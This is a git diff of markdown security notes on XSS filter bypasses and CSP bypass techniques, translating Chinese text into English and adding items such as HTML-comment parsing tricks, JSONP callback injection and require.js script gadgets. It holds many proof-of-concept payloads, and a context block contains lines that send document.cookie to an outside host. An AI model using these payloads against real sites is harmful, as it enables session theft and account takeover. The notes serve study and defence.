@@ -64,13 +64,35 @@ cript:
 alert(/1/);">
 ```  
 * URL bypass `.`, `//`  
-  RWCTF2018: `<?=ip2long("my-ip")` bypass dot，`\\` bypass `http://`  
+  urlencode, dec  
+  `\\` bypass `http://`  
   Sup: the first `/` is used to separate schema and path, the second `/` is part of path  
+  Even not need for `http`: `href="//www.google.com/"`  
 * htmlspecialchars bypass  
   php nature function, can convert `&`,`'`,`"`,`<`,`>` five kinds of char to string. It won't filter out the single quote if it doesn't   have the second parameter(`ENT_QUOTES`).  
 * bypass with ANSI charset (e.g. GBK, BIG5)  
   to fight against `magic_quotes_gpc = on` or `addslashes`  
   `1%81\" onclick=alert(1)/>`, `\` is 0x5C, 0x81 and 0x5C compose to a legal character in charset of GBK, so `"` wouldn't be escaped.  
+* bypass with comments for different filter(comments have priority in HTML)  
+  * Every filter needs HTML parser. Some HTML parsers could identify comments and ignore the data in comments.  
+  ```js
+  <!--ignored<!--ignored--><script>alert(1)</script>-->
+  // <script>alert(1)</script> is exposed and run
+  ```  
+  * Some HTML parsers not care about the comments
+  ```js
+  <!--<a href="--><img src=x onerror=alert(1)//">hi</a>
+  // HTML parsers consider as <a href="--><img src=x onerror=alert(1)//">hi</a> 
+  ```  
+  But, in fact, `<img src=x onerror=alert(1)>` is exposed.  
+* different attribute  
+```
+// type
+<input type="image" src=x onerror=alert(1)>
+```  
+* With json callback  
+  Many servers provide with data API which user can define callback function by themselves, e.g. `callback([{'id': 1}])`  
+  If the callback functions are not filtered appropriately, user can use `<script>alert(1)</script>([{}])` to complete xss attack  
 
 [PHP filter functions](https://blog.csdn.net/h1023417614/article/details/29560985)  
 
@@ -134,7 +156,7 @@ Second CSP: We can find controllable script from trusted.domain.com, or any **js
 ```php
 <script src="trusted.domain.com/jsonp?callback=alert(1)//"></script>
 ```
-In addition to jsonp, `Angularjs` also can be used to bypass the CSP. Therefore, we need `strict-dynamic`.  
+In addition to jsonp, `Angularjs` also can be used to bypass the CSP with `{{}}` instead of `eval`.  
 Let's take a look at more CSP  
 ```php
 header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ");
@@ -152,7 +174,7 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-i
      document.head.appendChild(x);
      ```
   2. redirect && cross domain  
-     跳轉的部分注意跳板也受host的限制，src路徑則跳脫限制  
+     Be careful redirect is also limited by host header, but `src` can escape the limit  
      ```js
      <script>location.href='http://lorexxar.cn?a+document.cookie'</script>
      <script>windows.open('http://lorexxar.cn?a=+document.cooke')</script>
@@ -163,57 +185,56 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-i
      x.click();
      ```  
 * nonce script CSP  
-  這是在CSP2出現的概念，Web應用會根據一個隨機token來判斷腳本是否可信任  
+  Website would identify script to executable or note with a random token  
   ```php
-  header("Content-Security-Policy: default-src 'self'; script-src 'nonce-{隨機}' ");
+  header("Content-Security-Policy: default-src 'self'; script-src 'nonce-{random}' ");
   ```
-  以上CSP只有帶一樣nonce`<script nonce="{隨機}">alert(1)</script>`的script才可以執行  
-  但是要**繞過**也很簡單，這個`隨機`字符串基本上是每次request都會重新產生(一次性)  
+  Only script like `<script nonce="{random}">alert(1)</script>` can run here.  
+  But, bypass is also possible. In fact, the `nonce` is generated once a request.  
   ```php
-  // 假設header裡面是類似 nonce-".$random." 在後端產生
   <script nonce="<?php echo $random ?>">
   ```  
-  **Sebastian Lekies** 提出**DOM XSS**可以完虐nonce script CSP  
+  Just like **Sebastian Lekies** bypass with **DOM XSS** because DOM XSS only works in client side.   
   [How to bypass CSP nonces with DOM XSS 🎅](http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)  
-  諸如`location.hash`操作的xss攻擊，根本不需要經過後台，那nonce的值也不會刷新  
+  Sush as `location.hash`, which won't be sent to the backend, and nonce would not be refreshed!  
 * strict-dynamic  
-  這是在CSP3中新規範的一種參數，為了現代各式各樣的框架而提出  
+  Created in CSP3 for various kinds of templates.  
   ```js
   script-src 'nonce-random' 'strict-dynamic'; object-src 'none'
-  // 以下為masakato對strict-dynamic的解釋
-  // 可加載
+  // the source can be loaded
   <script src='test.com/a.js' nonce='random'></script>
   ```
-  這樣一行CSP就可以確保所有**靜態**的`script`有匹配的nonce，strict-dynamic可以幫助開發人員在web運行過程中動態加載受信任的腳本  
-  如果`a.js`想要加載其他的js，只有**非parser-inserted**的script可以被允許執行  
+  strict-dynamic helps developers to run all the **dynamically-added** script created by **already-trusted** script.  
+  if `a.js` still wants to load other js, that could only for the script of **not parser-inserted** type  
   ```js
   <!-- a.js -->
-  // 可加載
+  // the source can be loaded
   var script = document.createElement('script');
   script.src = 'test.com/dependency.js';
   document.body.appendChild(script);
-  // 不可
+  // the source cannot be loaded
   document.write("<scr"+"ipt src='test.com/dependency.js'></scr"+"ipt>");
   ```
-  `createElement`時，element還屬於非parser-inserted屬性的，使用`documemt.write`的話就是parser-inserted屬性的了  
+  While `createElement`, element still not parser-inserted. But it becomes parser-inserted after using `documemt.write`.  
 
   :cat2:**Script Gadgets**：  
   [security-research-pocs by Google](https://github.com/google/security-research-pocs/tree/master/script-gadgets)  
-  Script Gadget是指一些已存在的js code用來bypass xss mitigations  
+  Script Gadget means existing js code to bypass xss mitigations  
   ```js
   // bypass with require.js
   Content-Security-Policy: "default-src='none';script-src 'nonce-random' 'strict-dynamic'"
   <script data-main="data:,alert(1)"></script>
   <script nonce="random" src="require.js"></script>
-  // 原因：require.js在找到帶有data-main屬性的script時，會如下載入
+  // Reason：require.js will find the script with attribute of data-main and load it like following
   var node = document.createElement('script');
   node.src = 'data:,alert(1)';
   document.head.appendChild(node);
-  // 如上面提到的，非parser-inserted
-  ```
+  ```  
+  Just like mentioned above, it is not parser-inserted.  
 
-  :cat2:**CVE-2018-5175** (利用**add-on**繞過strict-dynamic)：  
-  [首先extension和add-on都是些什麼東西？](https://developer.mozilla.org/zh-TW/Add-ons/WebExtensions)  
+  :cat2:**CVE-2018-5175** (Bypass strict-dynamic with add-on)：  
+  [Browser Extensions
+](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions)  
   legacy-extension就是那些過去以XUL/XPCOM為基礎所建造的擴充，雖然2017/11後基礎已改為Web-extensions，但瀏覽器內部至今還多使用這個機制  
   這裡我們必須了解`manifest`下的`web_accessible_resources`(webextension)以及`contentaccessible flag`(legacy extension)，被這個`url contentaccessible=yes`的resource可以從任何頁面載入，這裡就有個弊端了，**任何頁面載入並且不需要nonce允許**！  
   ```json
@@ -235,7 +256,7 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-i
   若不是框架中帶有的script-gadget，就從開發者的code中自己找一個，以下為思路：  
   某段script中將`attribute`的值插入`innerHTML`;  
 
-以web開發人員的角度推薦幾個工具：  
+Some recommended tools：  
 1. [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
 2. [ChromePlugin-CSP Mitigator](https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa)  
 
